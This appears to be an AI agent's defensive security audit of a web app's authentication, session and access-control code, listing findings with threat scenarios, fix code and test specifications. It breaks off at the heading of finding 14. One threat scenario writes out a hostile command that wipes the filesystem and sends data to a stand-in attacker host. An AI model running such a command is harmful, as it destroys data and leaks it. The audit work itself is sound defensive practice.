# Defensive Security Audit Report: Authentication & Access Control

**Auditor Agent**: `explorer_r6_auth`  
**Date**: 2026-10-17T05:45:00Z  
**Parent Orchestrator**: `orchestrator_r6` (Conversation ID: `8e2a6dd3-7ab0-4c08-84e9-557fd6782f75`)  
**Target Repository**: `c:/Users/roysu/LuminaVista`  
**Audit Scope**: Authentication flows, Sovereign session management, Zero-trust RBAC/ABAC, BOLA/IDOR in edge routes, Credential revocation tombstones & lifecycle, Privilege escalation vectors.

---

## Executive Summary & Vulnerability Ledger

Across the five scoped domains, a total of 15 security findings were identified and classified across the severity spectrum:
- **Critical**: 1
- **High**: 7
- **Medium**: 5
- **Low / Informational**: 2

| Finding ID | Title | Severity | CWE / OWASP | Target Location |
|---|---|---|---|---|
| **VULN-AUTH-R6-01** | Unauthenticated Google Calendar Mutation via Server Redis Credential Reuse | **Critical** | CWE-306 / OWASP API1 | `api/calendar.js:754-768, 930-1070` |
| **VULN-AUTH-R6-02** | Fail-Open Sovereign Session Mocking in Non-Production Environments | **High** | CWE-306 / OWASP API2 | `api/_lib/auth-guard.js:105-112` |
| **VULN-AUTH-R6-03** | Broken Object Level Authorization (BOLA) on Background Worker Job Lookups | **High** | CWE-639 / OWASP API1 | `api/worker.js:54-60` |
| **VULN-AUTH-R6-04** | Global Storage Namespace Collusion & Destructive Deletion in `api/storage.js` | **High** | CWE-639 / OWASP API1 | `api/storage.js:77-80, 126-179` |
| **VULN-AUTH-R6-05** | Shared Master Workspace State Poisoning & Data Erasure via Temporary Keys | **High** | CWE-284 / OWASP API5 | `api/sync.js:37-40, 88-130` |
| **VULN-AUTH-R6-06** | Zombie Key Resurrection via 90-Day Redis Tombstone Expiration | **High** | CWE-613 / OWASP API2 | `api/admin.js:194`, `api/auth.js:228-294` |
| **VULN-AUTH-R6-07** | Active Session Orphanage: Active Sessions Retained Following Access Key Revocation | **High** | CWE-613 / OWASP API2 | `api/admin.js:172-205`, `api/_lib/auth-guard.js:128-175` |
| **VULN-AUTH-R6-08** | OAuth2 State Missing Session Binding (OAuth Login CSRF & Account Linking) | **High** | CWE-352 / OWASP API8 | `api/calendar.js:266-284, 350-400` |
| **VULN-AUTH-R6-09** | Unrestricted Global Schedule Task Injection via `sync_schedules` | **High** | CWE-285 / OWASP API5 | `api/worker.js:136-146` |
| **VULN-AUTH-R6-10** | Logout Endpoint Ineffective for Bearer & Request Body Tokens | **Medium** | CWE-613 / OWASP API2 | `api/logout.js:11-13` |
| **VULN-AUTH-R6-11** | Cross-Site Cookie Invalidation Failure in `api/logout.js` | **Medium** | CWE-613 / OWASP API2 | `api/logout.js:34-42` |
| **VULN-AUTH-R6-12** | Secondary Credential Check Omits Revocation Tombstone Inspection | **Medium** | CWE-287 / OWASP API2 | `api/auth.js:166-226` |
| **VULN-AUTH-R6-13** | Storage Desynchronization in Minimum-1 Access Key Invariant Handling | **Medium** | CWE-284 / OWASP API5 | `api/admin.js:117-124, 177-190` |
| **VULN-AUTH-R6-14** | Missing RBAC Enforcement on `/api/chat` Telemetry and Execution Routes | **Low** | CWE-285 / OWASP API5 | `api/chat.js:144-166, 178-183` |
| **VULN-AUTH-R6-15** | OAuth Secret Normalization Discrepancy Across Edge Functions | **Informational** | CWE-327 / OWASP API2 | `api/calendar.js:269, 385` |

---

## 1. Observation

Direct code observations from inspected files:

### Obs 1: `api/calendar.js:754-768`
```javascript
754:   // If client lacks gcal_token cookie and falls back to Redis gcal:master_tokens, validate session
755:   const cookies = cookie.parse(req.headers?.cookie || '');
756:   const hasCookieToken = Boolean(cookies.gcal_token);
757:   if (!hasCookieToken) {
758:     const session = await validateSession(req, storage);
759:     const hasExplicitAuth = Boolean(req.headers?.['x-session-id'] || req.headers?.authorization || (req.headers?.cookie && req.headers.cookie.includes('godx_session')));
760:     if (hasExplicitAuth && !session.valid) {
761:       return sendSecureJson(res, 401, {
762:         connected: false,
763:         error: 'Authentication required. Please authenticate with LuminaVista session or Google OAuth cookie.'
764:       }, req);
765:     }
766:   }
767: 
768:   const accessToken = await getValidAccessToken(req, res);
```
When `hasExplicitAuth` is false (an anonymous caller sends neither `x-session-id`, `authorization`, nor `godx_session`), line 760 evaluates to false. The execution proceeds unconditionally to line 768. `getValidAccessToken` checks `gcal:master_tokens` in Redis, loads the master OAuth token, and sets it on the anonymous caller's cookie in line 705.

### Obs 2: `api/_lib/auth-guard.js:105-112`
```javascript
105:   const isProduction = Boolean(process.env.VERCEL) || process.env.NODE_ENV === 'production';
106:   const allowMock = !isProduction && process.env.ALLOW_MOCK_AUTH !== 'false';
107:   const redis = redisClient || getSafeStorage();
108: 
109:   // In local offline unit tests / non-production, permit mock sovereign sessions
110:   if (allowMock && (!redis || !sessionId || sessionId === 'sovereign_session' || sessionId.startsWith('mock_'))) {
111:     return { valid: true, sessionId: sessionId || 'sovereign_session', role: 'master' };
112:   }
```
If `ALLOW_MOCK_AUTH` is not explicitly set to `'false'` and the app runs in non-Vercel environments where `NODE_ENV` is unset or not `'production'`, `allowMock` is `true`. Passing `!sessionId` causes line 110 to evaluate to `true`, granting `{ valid: true, role: 'master' }` to unauthenticated requests.

### Obs 3: `api/worker.js:54-59`
```javascript
54:         // Enforce session ownership (BOLA prevention)
55:         const isOwner = !job.ownerSessionId || job.ownerSessionId === auth.sessionId || (auth.role === 'master' && job.ownerRole === 'master');
56:         if (!isOwner) {
57:           auditLog('WORKER_BOLA_BLOCKED', req, `Session ${auth.sessionId} attempted access to Job ${jobId}`);
58:           return sendSecureJson(res, 403, { error: 'Forbidden: Access to this job is restricted to the job creator.' });
59:         }
```
In `api/worker.js:108-115`, scheduled tasks generated by `run_due_schedules` call `executeAutonomousCloudTask` without providing `ownerSessionId` or `ownerRole`. In line 218, `ownerSessionId` is stored as `""`. Because `!job.ownerSessionId` is `true`, any user session (including temporary access keys) passes the `isOwner` check and reads the complete job state.

### Obs 4: `api/storage.js:126-136`
```javascript
126:   const STORAGE_NAMESPACE = 'user_vault';
127:   const targetPath = cleanPath
128:     ? (cleanPath.startsWith(`${STORAGE_NAMESPACE}/`) ? cleanPath : `${STORAGE_NAMESPACE}/${cleanPath}`)
129:     : (action === 'list' ? STORAGE_NAMESPACE : '');
```
And lines 77-80:
```javascript
77:   if (auth.role !== 'master' && auth.role !== 'temporary') {
78:     auditLog('INSUFFICIENT_PRIVILEGES', req, 'Endpoint: /api/storage');
79:     return sendSecureJson(res, 403, { error: 'Forbidden: Cloud storage access requires authenticated session' });
80:   }
```
Sessions with `role: 'temporary'` have identical write, delete, and read access to the root `user_vault` directory as `role: 'master'`.

### Obs 5: `api/sync.js:37-40, 101-130`
```javascript
37:   if (auth.role !== 'master' && auth.role !== 'temporary') {
38:     auditLog('INSUFFICIENT_PRIVILEGES', req, 'Endpoint: /api/sync');
39:     return sendSecureJson(res, 403, { error: 'Forbidden: Workspace sync requires authenticated session' }, req);
40:   }
...
129:   await redis.set(sessionKey, JSON.stringify(newState));
```
Both `master` and `temporary` sessions read and write to `sessionKey = "master_workspace_state"`. A temporary key holder can POST an empty payload for `notes`, `calendar`, `vfs`, and `aiConversation`, overwriting the master administrator's workspace.

### Obs 6: `api/admin.js:194` and `api/auth.js:228-294`
```javascript
// api/admin.js:194
await storage.set('admin:revoked_key:' + id, String(Date.now()), { ex: 86400 * 90 });
```
And in `api/auth.js:267-292`:
```javascript
267:           const isRevoked = await storage.get(`admin:revoked_key:${matchedClientKey.id}`);
268:           if (isRevoked) {
269:             auditLog('REVOKED_KEY_REJECTED', null, `Rejected revoked clientKey ${matchedClientKey.id}`);
270:             return { authenticated: false };
271:           }
...
291:             await storage.set('admin:temp_passwords', JSON.stringify(parsedCurrent));
```
When the 90-day tombstone in Redis expires, `isRevoked` is null. The client's signed offline key in `clientKeys` verifies against `expectedPassword`, succeeds authentication, and lines 275-294 re-inject the key into `admin:temp_passwords`.

### Obs 7: `api/_lib/auth-guard.js:128-175`
```javascript
134:       try {
135:         [revocationMarker, sessionRecord] = await Promise.all([
136:           redis.get(`session:revoked:${sessionId}`),
137:           redis.get(`session:${sessionId}`)
138:         ]);
...
167:           if (parsed.keyId) keyId = parsed.keyId;
...
175:       return { valid: true, sessionId, role, keyId };
```
`validateSession` extracts `keyId = parsed.keyId`, but never executes `redis.get('admin:revoked_key:' + keyId)`. Deleting an access key in `api/admin.js` sets `admin:revoked_key:${id}`, but existing active sessions tied to that `keyId` continue to pass `validateSession`.

### Obs 8: `api/calendar.js:266-284, 350-400`
```javascript
276:   const sig = crypto.createHmac('sha256', oauthSecret).update(`${nonce}:${redirectUri}:${ts}`).digest('hex');
277:   const stateObj = {
278:     redirect_uri: redirectUri,
279:     nonce,
280:     ts,
281:     sig
282:   };
```
The state object contains only `redirect_uri`, `nonce`, `ts`, and `sig`. It does not contain `sessionId`, user ID, or an HMAC hash of a client cookie.

### Obs 9: `api/logout.js:11-28, 35-42`
```javascript
11:     const match = (req.headers?.cookie || '').match(/godx_session=([a-zA-Z0-9_-]+)/);
12:     const sid = (match && match[1]) || req.headers?.['x-session-id'] || '';
...
35:       serialize('godx_session', '', {
36:         httpOnly: true,
37:         secure: true,
38:         sameSite: 'strict',
39:         partitioned: isCrossSite || isHttps,
40:         maxAge: -1,
41:         path: '/'
42:       }),
```
`api/logout.js` does not parse `Authorization: Bearer <token>` or `req.body.userSession`. In cross-site contexts, `sameSite: 'strict'` is emitted instead of `isCrossSite ? 'none' : 'strict'`.

---

## 2. Logic Chain

1. **Premise 1 (Calendar Auth Bypass)**: `api/calendar.js` is designed to be accessible to sovereign guests for status checks (`action=status`) and OAuth initiation (`action=auth`). However, `handleSync` (lines 754-766) contains an authorization branch that only sends HTTP 401 if `hasExplicitAuth && !session.valid`. An unauthenticated attacker sending no session headers sets `hasExplicitAuth = false`, entirely skipping the 401 response. In lines 630-644, `getValidAccessToken` retrieves `gcal:master_tokens` from Redis if no cookie token exists. Consequently, the anonymous request is executed using the administrator's Google OAuth credentials, permitting unauthorized reads, writes, and deletions in the administrator's real Google Calendar.
2. **Premise 2 (Environment Separation in Auth Guard)**: In `api/_lib/auth-guard.js`, `allowMock` is active whenever `!process.env.VERCEL && process.env.NODE_ENV !== 'production'`. Because `allowMock` returns `{ valid: true, role: 'master' }` when `!sessionId` is true, any deployment outside Vercel (or where `NODE_ENV` is not set to `'production'`) becomes completely open to unauthenticated root admin takeover.
3. **Premise 3 (Tombstone Expiration and Resurrecting Credentials)**: Cryptographically signed sovereign client keys (`clientKeys`) can be verified even if Redis is empty or cold. When an administrator revokes a key in `api/admin.js`, a tombstone is written to `admin:revoked_key:${id}` with a 90-day TTL (`ex: 86400 * 90`). Once the 90 days elapse, the tombstone vanishes from Redis. When the client reconnects with their cached signed vault item, `verifyCredentials` in `api/auth.js` checks the tombstone, finds nothing, validates the cryptographic signature, and re-hydrates the revoked key back into `admin:temp_passwords`.
4. **Premise 4 (Revocation Session Invalidation Gap)**: When `api/admin.js` revokes a key, it writes the tombstone `admin:revoked_key:${id}`. However, existing active sessions generated by `api/auth.js` store `keyId` in the session record. `validateSession` never checks `admin:revoked_key:${keyId}` during request validation. Therefore, revoking an access key does not invalidate active sessions, violating real-time revocation guarantees.
5. **Premise 5 (Multi-Tenant / Multi-Role Object Isolation)**: LuminaVista OS models two roles: `master` and `temporary`. However, `api/storage.js` and `api/sync.js` do not isolate objects or state between these roles. Both roles read and write to the same `user_vault` GitHub directory and `master_workspace_state` Redis key. A temporary user can read private files, overwrite code, or wipe the master workspace state.
6. **Premise 6 (OAuth CSRF & Account Linking)**: The OAuth state generated in `api/calendar.js:276-282` is signed by the server, but is not bound to the user's session or browser cookie. Because the state is valid for 15 minutes, an attacker can initiate OAuth, obtain their own code and state, and trick an authenticated victim into opening `/api/calendar/callback`, linking the attacker's Google Calendar to the victim's OS session.

---

## 3. Deep Technical Finding Ledger

### VULN-AUTH-R6-01: Unauthenticated Google Calendar Mutation via Server Redis Credential Reuse
- **Target File & Lines**: `api/calendar.js:754-768, 930-1070`
- **CWE / OWASP**: CWE-306 (Missing Authentication for Critical Function) / OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization
- **Root Cause**: `handleSync` uses `if (hasExplicitAuth && !session.valid)` to guard requests without cookie credentials. If an anonymous caller provides no authentication headers at all, `hasExplicitAuth` is `false`, bypassing the check. The endpoint then loads `gcal:master_tokens` from Redis and performs operations using the master account's Google API credentials.
- **Threat Scenario**: An unauthenticated attacker discovers the public `/api/calendar?action=sync` endpoint. By sending a `POST` request with `{ title: "Malicious Event", start: "2026-10-25" }` or a `DELETE` request with `eventId=gcal_...` without sending any headers, the attacker modifies or wipes the administrator's authentic Google Calendar events.
- **Defensive Remediation**:
  1. In `api/calendar.js` within `handleSync`, fail closed when relying on Redis credentials:
     ```javascript
     if (!hasCookieToken) {
       const session = await validateSession(req, storage);
       if (!session || !session.valid) {
         return sendSecureJson(res, 401, {
           connected: false,
           error: 'Authentication required. Please authenticate with a valid LuminaVista session or Google OAuth cookie.'
         }, req);
       }
     }
     ```
  2. For state mutations (`POST`, `PUT`, `DELETE`), strictly enforce that `session.valid` is true regardless of token presence.
- **Verification Method (Automated Test Specification)**:
  Send a `POST /api/calendar/sync` and `DELETE /api/calendar/sync?eventId=123` with no cookie and no authorization headers while `gcal:master_tokens` is populated in Redis. Assert response is HTTP 401 with `{ connected: false }`.

---

### VULN-AUTH-R6-02: Fail-Open Sovereign Session Mocking in Non-Production Environments
- **Target File & Lines**: `api/_lib/auth-guard.js:105-112`
- **CWE / OWASP**: CWE-306 (Missing Authentication for Critical Function) / OWASP API Security Top 10 - API2:2023 Broken Authentication
- **Root Cause**: In `api/_lib/auth-guard.js`, `allowMock` is enabled whenever `!process.env.VERCEL && process.env.NODE_ENV !== 'production'`. In line 110, `!sessionId` triggers `allowMock`, returning `{ valid: true, sessionId: 'sovereign_session', role: 'master' }`.
- **Threat Scenario**: When deployed on non-Vercel platforms (e.g. Docker, AWS, Render, self-hosted staging) where `NODE_ENV` is unset or `development`, any unauthenticated attacker sending no headers is automatically authenticated as `role: 'master'`, obtaining administrative access to `/api/admin`, `/api/terminal`, `/api/storage`, and `/api/sync`.
- **Defensive Remediation**:
  Never allow `!sessionId` to bypass authentication in `validateSession`. Mocking must be strictly opt-in and restricted exclusively to explicit test headers in designated unit test runs:
  ```javascript
  const isProduction = Boolean(process.env.VERCEL) || process.env.NODE_ENV === 'production';
  const allowMock = !isProduction && process.env.ALLOW_MOCK_AUTH === 'true';
  if (allowMock && sessionId && (sessionId === 'sovereign_session' || sessionId.startsWith('mock_'))) {
    return { valid: true, sessionId, role: 'master' };
  }
  ```
- **Verification Method (Automated Test Specification)**:
  Invoke `validateSession(req, storage)` with an empty request object (`req.headers = {}`) in an environment where `NODE_ENV` is `'development'`. Assert that `{ valid: false, status: 401 }` is returned.

---

### VULN-AUTH-R6-03: Broken Object Level Authorization (BOLA) on Background Worker Job Lookups
- **Target File & Lines**: `api/worker.js:54-60`
- **CWE / OWASP**: CWE-639 (Authorization Bypass Through User-Controlled Key) / OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization
- **Root Cause**: In `api/worker.js:55`, `const isOwner = !job.ownerSessionId || job.ownerSessionId === auth.sessionId || (auth.role === 'master' && job.ownerRole === 'master')`. Tasks scheduled by `run_due_schedules` or legacy tasks store `ownerSessionId: ""` or omit it. Since `!job.ownerSessionId` evaluates to `true`, any authenticated user (including temporary keys) can access the job details.
- **Threat Scenario**: A temporary user or compromised secondary key holder queries `GET /api/worker?jobId=sched_backup_1729140000`. The server returns `{ success: true, job: { prompt: "...", vfs: { ... }, logs: [ ... ] } }`, exposing sensitive code, database credentials, or private configuration.
- **Defensive Remediation**:
  1. In `api/worker.js`, ensure `run_due_schedules` binds scheduled jobs to the system/master identity: `ownerRole: 'master'`, `ownerSessionId: 'system_master_scheduler'`.
  2. Disallow access to jobs with empty `ownerSessionId` unless the requesting session has `auth.role === 'master'`:
     ```javascript
     const isOwner = (job.ownerSessionId && job.ownerSessionId === auth.sessionId) ||
                     (auth.role === 'master');
     if (!isOwner) {
       return sendSecureJson(res, 403, { error: 'Forbidden: Access to this job is restricted to the job creator or master administrator.' });
     }
     ```
- **Verification Method (Automated Test Specification)**:
  Create a job with `ownerSessionId: ""` or `ownerSessionId: "session_user_A"`. Query `GET /api/worker?jobId=...` using a session with `role: 'temporary'` and `sessionId: "session_user_B"`. Verify that HTTP 403 Forbidden is returned.

---

### VULN-AUTH-R6-04: Global Storage Namespace Collusion & Destructive Deletion in `api/storage.js`
- **Target File & Lines**: `api/storage.js:77-80, 126-179`
- **CWE / OWASP**: CWE-639 (Authorization Bypass Through User-Controlled Key) / OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization
- **Root Cause**: `api/storage.js` assigns all authenticated users (`role === 'master'` and `role === 'temporary'`) to the identical root directory `user_vault`. There is no role-based permission check on `action === 'delete'` or namespace isolation between master and temporary credentials.
- **Threat Scenario**: An untrusted user granted a temporary key (e.g. for a field terminal) calls `POST /api/storage` with `{ action: 'delete', path: 'critical_master_backup.json' }` or `{ action: 'write', path: 'config.json', content: '...' }`. The server commits the deletion/modification to the backing GitHub repository, destroying the master administrator's data.
- **Defensive Remediation**:
  1. Restrict destructive storage operations (`action === 'delete'`) strictly to `auth.role === 'master'`:
     ```javascript
     if (action === 'delete' && auth.role !== 'master') {
       auditLog('STORAGE_FORBIDDEN', req, `Temporary session attempted file deletion (${cleanPath})`);
       return sendSecureJson(res, 403, { error: 'Forbidden: File deletion requires master administrator role.' });
     }
     ```
  2. If temporary keys require storage write access, partition temporary keys into their own subfolder namespace: `user_vault/temp_keys/${auth.keyId || 'shared'}/`.
- **Verification Method (Automated Test Specification)**:
  Issue a `POST /api/storage` with `action: 'delete'`, `path: 'document.txt'` using a session with `role: 'temporary'`. Assert that HTTP 403 Forbidden is returned.

---

### VULN-AUTH-R6-05: Shared Master Workspace State Poisoning & Data Erasure via Temporary Keys
- **Target File & Lines**: `api/sync.js:37-40, 88-130`
- **CWE / OWASP**: CWE-284 (Improper Access Control) / OWASP API Security Top 10 - API5:2023 Broken Function Level Authorization
- **Root Cause**: `api/sync.js` permits sessions with `role: 'temporary'` to execute `POST` requests directly against `sessionKey = "master_workspace_state"`.
- **Threat Scenario**: A guest or temporary user connected to LuminaVista OS triggers a sync event or submits a POST payload containing empty arrays (`{ notes: [], vfs: {}, calendar: [] }`). The server writes this directly to `master_workspace_state`, wiping out the master administrator's notes, virtual filesystem, and calendars across all devices.
- **Defensive Remediation**:
  1. Enforce that mutations (`POST`) to `master_workspace_state` require `auth.role === 'master'`:
     ```javascript
     if (req.method === 'POST' && auth.role !== 'master') {
       auditLog('SYNC_FORBIDDEN', req, `Temporary session attempted master state modification`);
       return sendSecureJson(res, 403, { error: 'Forbidden: Workspace state modification requires master administrator session.' }, req);
     }
     ```
  2. For temporary sessions, provide non-destructive read access or isolate their state into a session-scoped key (`temp_workspace_state:${auth.keyId}`).
- **Verification Method (Automated Test Specification)**:
  Send a `POST /api/sync` payload with `{ data: { notes: [] } }` using a session with `role: 'temporary'`. Assert HTTP 403 Forbidden is returned and `master_workspace_state` in Redis remains unchanged.

---

### VULN-AUTH-R6-06: Zombie Key Resurrection via 90-Day Redis Tombstone Expiration
- **Target File & Lines**: `api/admin.js:194`, `api/auth.js:228-294`
- **CWE / OWASP**: CWE-613 (Insufficient Session Expiration) / OWASP API Security Top 10 - API2:2023 Broken Authentication
- **Root Cause**: When an access key is deleted in `api/admin.js:194`, the revocation tombstone is written with a finite expiration: `{ ex: 86400 * 90 }`. After 90 days, Redis purges the tombstone key `admin:revoked_key:${id}`. When the client sends the signed key via `clientKeys`, `api/auth.js` verifies the cryptographic HMAC signature, checks the tombstone, finds it absent, and automatically re-hydrates the revoked key back into active storage.
- **Threat Scenario**: An employee or contractor leaves an organization, and their temporary key is revoked. 90 days later, the tombstone expires. The former contractor presents their cached client key, successfully logs in, and the system automatically restores their key into `admin:temp_passwords`.
- **Defensive Remediation**:
  1. Never set an expiration on revocation tombstones:
     ```javascript
     await storage.set('admin:revoked_key:' + id, String(Date.now()));
     ```
  2. Maintain a persistent revoked keys set in Redis: `admin:revoked_keys_set`.
  3. When an access key is deleted, invalidate and strip it from the client vault mirror in `master_workspace_state`.
- **Verification Method (Automated Test Specification)**:
  Delete key `key_test_123` via `api/admin.js`. Confirm `admin:revoked_key:key_test_123` is persisted without a finite TTL (or TTL is -1/none). Submit `key_test_123` in `clientKeys` to `api/auth.js` and verify authentication is rejected with `{ authenticated: false }`.

---

### VULN-AUTH-R6-07: Active Session Orphanage: Active Sessions Retained Following Access Key Revocation
- **Target File & Lines**: `api/admin.js:172-205`, `api/_lib/auth-guard.js:128-175`
- **CWE / OWASP**: CWE-613 (Insufficient Session Expiration) / OWASP API Security Top 10 - API2:2023 Broken Authentication
- **Root Cause**: `validateSession` in `api/_lib/auth-guard.js` inspects `session:revoked:${sessionId}` and `session:${sessionId}`. It extracts `keyId = parsed.keyId`, but never checks `redis.get('admin:revoked_key:' + keyId)`. Deleting an access key in `api/admin.js` does not revoke active sessions associated with that `keyId`.
- **Threat Scenario**: An administrator detects unauthorized activity and deletes an access key via the Admin Security settings panel. The active attacker session remains valid and active, continuing to slide its 20-minute expiration window on every request.
- **Defensive Remediation**:
  In `api/_lib/auth-guard.js` inside `validateSession`:
  ```javascript
  if (keyId && typeof redis.get === 'function') {
    const isKeyRevoked = await redis.get(`admin:revoked_key:${keyId}`);
    if (isKeyRevoked) {
      auditLog('SESSION_REVOKED_BY_KEY', req, `Session ${sessionId} rejected because underlying key ${keyId} is revoked`);
      return { valid: false, status: 401, error: 'Session Revoked (Access Key Deleted)' };
    }
  }
  ```
- **Verification Method (Automated Test Specification)**:
  Authenticate with temporary key `key_temp_1`. Capture `sessionId`. Delete `key_temp_1` via `POST /api/admin action: delete`. Send an API request using the captured `sessionId`. Assert that the request is rejected with HTTP 401.

---

### VULN-AUTH-R6-08: OAuth2 State Missing Session Binding (OAuth Login CSRF & Account Linking)
- **Target File & Lines**: `api/calendar.js:266-284, 350-400`
- **CWE / OWASP**: CWE-352 (Cross-Site Request Forgery) / OWASP API Security Top 10 - API8:2023 Security Misconfiguration
- **Root Cause**: The OAuth `state` parameter generated by `handleAuth` contains `{ redirect_uri, nonce, ts, sig }`. The signature is computed over server-wide secrets (`ADMIN_PASSWORD` / `GOOGLE_CLIENT_SECRET`) without binding to the user's specific session or setting an anti-CSRF cookie.
- **Threat Scenario**: An attacker initiates OAuth to their own Google account on LuminaVista OS and intercepts the resulting authorization code and state. The attacker sends a link or iframe targeting the victim: `/api/calendar/callback?code=ATTACKER_CODE&state=VALID_SIGNED_STATE`. The victim's browser completes the callback, storing the attacker's Google Calendar credentials in the victim's session/Redis. All calendar events created by the victim are synchronized to the attacker's calendar.
- **Defensive Remediation**:
  1. Bind the OAuth `state` to the client's session ID or set an HttpOnly `oauth_state_nonce` cookie:
     ```javascript
     const session = await validateSession(req, storage);
     const sessionBinding = session.valid ? session.sessionId : crypto.randomBytes(16).toString('hex');
     const sig = crypto.createHmac('sha256', oauthSecret).update(`${nonce}:${redirectUri}:${ts}:${sessionBinding}`).digest('hex');
     ```
  2. Set a temporary HttpOnly cookie with `oauth_state_nonce` and verify it in `handleCallback`.
- **Verification Method (Automated Test Specification)**:
  Initiate OAuth under Session A. Capture the generated `state`. Attempt to execute `handleCallback` with that `state` under Session B. Assert that the callback fails with HTTP 400 Bad Request.

---

### VULN-AUTH-R6-09: Unrestricted Global Schedule Task Injection via `sync_schedules`
- **Target File & Lines**: `api/worker.js:136-146`
- **CWE / OWASP**: CWE-285 (Improper Authorization) / OWASP API Security Top 10 - API5:2023 Broken Function Level Authorization
- **Root Cause**: In `POST /api/worker`, `action === 'sync_schedules'` writes client-provided schedules directly into `cloud_scheduled_tasks` in Redis without checking if `auth.role === 'master'`.
- **Threat Scenario**: A temporary user posts an autonomous scheduled task containing shell commands (`[TOOL:EXEC] rm -rf / ; curl attacker.com/leak`). When `run_due_schedules` is triggered, the worker boots an E2B microVM and executes the attacker's directives with cloud infrastructure privileges.
- **Defensive Remediation**:
  Require `auth.role === 'master'` for syncing global schedules:
  ```javascript
  if (action === 'sync_schedules') {
    if (auth.role !== 'master') {
      auditLog('WORKER_FORBIDDEN', req, `Temporary session attempted schedule sync`);
      return sendSecureJson(res, 403, { error: 'Forbidden: Cloud schedule synchronization requires master administrator role.' });
    }
    // ...
  }
  ```
- **Verification Method (Automated Test Specification)**:
  Send `POST /api/worker` with `action: 'sync_schedules'`, `schedules: [...]` using a session with `role: 'temporary'`. Assert HTTP 403 Forbidden is returned.

---

### VULN-AUTH-R6-10: Logout Endpoint Ineffective for Bearer & Request Body Tokens
- **Target File & Lines**: `api/logout.js:11-13`
- **CWE / OWASP**: CWE-613 (Insufficient Session Expiration) / OWASP API Security Top 10 - API2:2023 Broken Authentication
- **Root Cause**: `api/logout.js` only extracts `sid` from `req.headers.cookie` and `req.headers['x-session-id']`. If a client authenticates via `Authorization: Bearer <token>` or `req.body.userSession` (both supported by `validateSession`), `sid` evaluates to empty string.
- **Threat Scenario**: An API integration or mobile web client authenticating via Bearer token sends a logout request. The server returns `{ success: true }`, but the session token is never deleted or tombstoned in Redis. The token remains valid until sliding TTL expiration.
- **Defensive Remediation**:
  Align token extraction in `api/logout.js` with `validateSession`:
  ```javascript
  const cookieMatch = (req.headers?.cookie || '').match(/godx_session=([a-zA-Z0-9_-]+)/);
  const sid = (cookieMatch && cookieMatch[1]) ||
              req.headers?.['x-session-id'] ||
              req.headers?.authorization?.replace(/^Bearer\s+/i, '') ||
              req.body?.userSession ||
              req.body?.sessionId ||
              '';
  ```
- **Verification Method (Automated Test Specification)**:
  Authenticate and obtain a session token. Issue `POST /api/logout` with header `Authorization: Bearer <sessionId>`. Verify that `session:<sessionId>` is removed from Redis and `session:revoked:<sessionId>` is created.

---

### VULN-AUTH-R6-11: Cross-Site Cookie Invalidation Failure in `api/logout.js`
- **Target File & Lines**: `api/logout.js:34-42`
- **CWE / OWASP**: CWE-613 (Insufficient Session Expiration) / OWASP API Security Top 10 - API2:2023 Broken Authentication
- **Root Cause**: `api/auth.js` sets `godx_session` with `sameSite: isCrossSite ? 'none' : 'lax'`. In `api/logout.js:38`, it hardcodes `sameSite: 'strict'`. In third-party cross-site contexts (e.g. GitHub Pages calling Vercel API), modern browser partitioning rules reject clearing cookies with `SameSite=Strict`.
- **Threat Scenario**: A user on `https://subhadraroy.github.io` logs out. The server emits `Set-Cookie: godx_session=; SameSite=Strict; Partitioned`. The browser does not clear the partitioned cross-site cookie. A subsequent reload re-authenticates the user automatically.
- **Defensive Remediation**:
  In `api/logout.js`, mirror the `SameSite` logic from `api/auth.js`:
  ```javascript
  sameSite: isCrossSite ? 'none' : 'lax',
  secure: isCrossSite ? true : isHttps,
  partitioned: isCrossSite || isHttps,
  ```
- **Verification Method (Automated Test Specification)**:
  Issue `POST /api/logout` with `Origin: https://subhadraroy.github.io`. Verify that the `Set-Cookie` header for `godx_session` contains `SameSite=None; Secure; Partitioned`.

---

### VULN-AUTH-R6-12: Secondary Credential Check Omits Revocation Tombstone Inspection
- **Target File & Lines**: `api/auth.js:166-226`
- **CWE / OWASP**: CWE-287 (Improper Authentication) / OWASP API Security Top 10 - API2:2023 Broken Authentication
- **Root Cause**: In `api/auth.js`, the secondary check validates passwords against `admin:temp_passwords` and `master_workspace_state.admin_passwords`. However, it does not check `admin:revoked_key:${matchedKey.id}` before returning `{ authenticated: true, type: 'temporary' }`.
- **Threat Scenario**: If a key was backed up in `master_workspace_state.admin_passwords` and the primary key in `admin:temp_passwords` was deleted, the fallback restores it. Because the secondary check lacks a tombstone guard, the revoked key is accepted as valid.
- **Defensive Remediation**:
  In `api/auth.js` inside the secondary check (lines 209-222):
  ```javascript
  if (matchedKey) {
    if (storage && typeof storage.get === 'function') {
      const isRevoked = await storage.get(`admin:revoked_key:${matchedKey.id}`);
      if (isRevoked) {
        auditLog('REVOKED_KEY_REJECTED', null, `Rejected revoked temp key ${matchedKey.id}`);
        return { authenticated: false };
      }
    }
    // ...
  }
  ```
- **Verification Method (Automated Test Specification)**:
  Add an entry to `master_workspace_state.admin_passwords` with `id: "key_rev_test"`. Set `admin:revoked_key:key_rev_test = "1"`. Attempt login via `verifyCredentials`. Verify that authentication returns `{ authenticated: false }`.

---

### VULN-AUTH-R6-13: Storage Desynchronization in Minimum-1 Access Key Invariant Handling
- **Target File & Lines**: `api/admin.js:117-124, 177-190`
- **CWE / OWASP**: CWE-284 (Improper Access Control) / OWASP API Security Top 10 - API5:2023 Broken Function Level Authorization
- **Root Cause**: In `api/admin.js`, `action === 'delete'` and `action === 'create'` read solely from `ADMIN_PASSWORDS_KEY` (`admin:temp_passwords`). They omit the fallback to `master_workspace_state.admin_passwords` that `GET` implements. If `admin:temp_passwords` is empty, `create` overwrites `master_workspace_state` with a single key, losing all existing keys, while `delete` fails to delete valid keys present in workspace state.
- **Threat Scenario**: Following a Redis cache restart or eviction, an admin accesses settings. `GET` properly re-hydrates keys from `master_workspace_state`. However, provisioning a new key wipes out all existing keys in `master_workspace_state`, violating administrative invariant guarantees and disrupting user access.
- **Defensive Remediation**:
  Create a shared helper `getAdminPasswords(storage)` in `api/admin.js` used consistently across `GET`, `create`, and `delete` that queries `admin:temp_passwords` and mirrors from `master_workspace_state` when empty.
- **Verification Method (Automated Test Specification)**:
  Clear `admin:temp_passwords` in Redis while seeding 2 keys in `master_workspace_state.admin_passwords`. Issue `POST /api/admin action: create`. Verify that all previous keys plus the new key are retained in both Redis and `master_workspace_state`.

---

### VULN-AUTH-R6-14: Missing RBAC Enforcement on `/api/chat` Telemetry and Execution Routes
